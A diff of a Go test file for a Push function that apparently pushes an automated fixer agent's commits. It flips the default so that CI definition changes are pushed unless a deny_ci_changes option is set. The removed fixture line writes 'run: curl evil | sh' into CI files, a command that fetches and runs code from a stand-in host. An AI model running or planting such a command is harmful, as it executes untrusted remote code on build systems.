@@ -84,24 +84,29 @@ func TestPushRefusesAShallowTrustedDir(t *testing.T) {
 	}
 }
 
-func TestPushRefusesCIChangesUnlessAllowed(t *testing.T) {
+// A push carries CI definition changes by default (a fixer's work often
+// is one); deny_ci_changes, opted into, refuses them.
+func TestPushRefusesCIChangesOnlyWhenDenied(t *testing.T) {
 	for _, p := range []string{".github/workflows/ci.yml", ".gitlab-ci.yml", ".circleci/config.yml", "Jenkinsfile", ".github/actions/x/action.yml"} {
 		f := newFixture(t)
 		before := run(t, f.remote, "git", "rev-parse", "fix/1")
 		os.MkdirAll(filepath.Join(f.ws, filepath.Dir(p)), 0o755)
-		f.commit(t, p, "run: curl evil | sh\n")
+		f.commit(t, p, "run: make test\n")
 		f.commit(t, "after.txt", "x\n")
-		_, err := Push(context.Background(), f.req())
+		denied := f.req()
+		denied.DenyCIChanges = true
+		_, err := Push(context.Background(), denied)
 		if !errors.Is(err, ErrCIChange) || !strings.Contains(err.Error(), p) {
-			t.Fatalf("%s: a CI definition change is refused: %v", p, err)
+			t.Fatalf("%s: deny_ci_changes refuses a CI definition change: %v", p, err)
 		}
 		if run(t, f.remote, "git", "rev-parse", "fix/1") != before {
 			t.Fatalf("%s: nothing pushed", p)
 		}
-		r := f.req()
-		r.AllowCIChanges = true
-		if _, err := Push(context.Background(), r); err != nil {
-			t.Fatalf("%s: allow_ci_changes lets it through: %v", p, err)
+		if _, err := Push(context.Background(), f.req()); err != nil {
+			t.Fatalf("%s: by default a CI change is pushed: %v", p, err)
+		}
+		if run(t, f.remote, "git", "rev-parse", "fix/1") == before {
+			t.Fatalf("%s: the default push did not land", p)
 		}
 	}
 	// Not CI: a path that only looks like one.
@@ -112,7 +117,7 @@ func TestPushRefusesCIChangesUnlessAllowed(t *testing.T) {
 	}
 }
 
-// Merging a branch that already carries a CI change is not the agent's
+// Under deny_ci_changes, merging a branch that already carries a CI change is not the agent's
 // change: only what a merge itself alters against every parent counts.
 func TestPushAllowsAMergeBringingCIChangesIn(t *testing.T) {
 	f := newFixture(t)
@@ -127,7 +132,9 @@ func TestPushAllowsAMergeBringingCIChangesIn(t *testing.T) {
 	f.commit(t, "b.txt", "b\n")
 	run(t, f.ws, "git", "fetch", "-q", f.remote, "main")
 	run(t, f.ws, "git", "merge", "-q", "--no-edit", "FETCH_HEAD")
-	if _, err := Push(context.Background(), f.req()); err != nil {
+	r := f.req()
+	r.DenyCIChanges = true
+	if _, err := Push(context.Background(), r); err != nil {
 		t.Fatalf("a merge of main's own CI change is not the agent's: %v", err)
 	}
 }
